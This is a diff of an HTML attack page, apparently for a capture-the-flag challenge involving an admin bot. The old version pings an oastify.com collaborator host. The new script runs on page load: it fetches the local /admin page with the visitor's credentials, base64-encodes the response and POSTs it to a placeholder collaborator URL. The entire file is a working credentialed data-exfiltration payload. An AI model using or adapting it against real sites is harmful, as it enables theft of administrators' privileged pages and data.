@@ -1,23 +1,31 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Exploit Page</title>
-  </head>
-  <body>
-    <script>
-      // Example: make an admin-only POST request
-      fetch("https://sgctyjfjy72sovxi0bsofid3wu2lqde2.oastify.com/log", {
+<head><title>Steal Admin Page</title></head>
+<body>
+<script>
+  (async () => {
+    try {
+      // Visit the /admin page as the admin (same origin: 127.0.0.1:1337)
+      const adminResponse = await fetch("http://127.0.0.1:1337/admin", {
+        method: "GET",
+        credentials: "include"
+      });
+
+      const htmlText = await adminResponse.text();
+
+      // Base64 encode the HTML
+      const base64Html = btoa(unescape(encodeURIComponent(htmlText)));
+
+      // Send it to your collaborator URL
+      await fetch("https://your-collaborator-url.com/collect", {
         method: "POST",
-        credentials: "include",
-      })
-        .then(() => {
-          // Optionally notify your server
-          fetch("https://sgctyjfjy72sovxi0bsofid3wu2lqde2.oastify.com/log", {
-            method: "POST",
-            body: "Admin bot visited and did the exploit",
-          });
-        })
-        .catch(console.error);
-    </script>
-  </body>
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ data: base64Html })
+      });
+    } catch (err) {
+      console.error("Error exfiltrating admin page:", err);
+    }
+  })();
+</script>
+</body>
 </html>
